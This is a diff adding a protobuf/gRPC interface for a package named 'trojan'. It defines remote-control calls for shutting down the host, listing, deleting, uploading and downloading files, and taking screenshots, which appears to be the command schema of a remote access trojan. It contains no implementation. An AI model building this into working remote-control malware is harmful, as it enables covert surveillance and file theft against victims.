@@ -1,0 +1,37 @@
+syntax = "proto3";
+
+package trojan;
+
+import "google/protobuf/empty.proto";
+
+service TrojanBaseService {
+  rpc PrintStringOnServer(SimpleStringMessage) returns (google.protobuf.Empty) {}
+
+  rpc ShutDownServer(ShutDownServerMessage) returns (google.protobuf.Empty) {}
+
+  rpc ShutDownCancel(google.protobuf.Empty) returns (google.protobuf.Empty) {}
+
+  rpc GetFileList(SimpleStringMessage) returns (SimpleStringMessage) {}
+
+  rpc GetSnapShot(google.protobuf.Empty) returns (SimpleStringMessage) {} // Should be base64 encoded
+
+  rpc DeleteFile(SimpleStringMessage) returns (google.protobuf.Empty) {}
+
+  rpc UploadFile(FileMessage) returns (google.protobuf.Empty) {}
+
+  rpc DownloadFile(SimpleStringMessage) returns (FileMessage) {}
+}
+
+message SimpleStringMessage {
+  bytes message = 1;
+}
+
+message ShutDownServerMessage {
+  uint32 count_down = 1;
+}
+
+message FileMessage {
+  uint32 size = 1;
+  bytes name = 2;
+  bytes content = 3;
+}
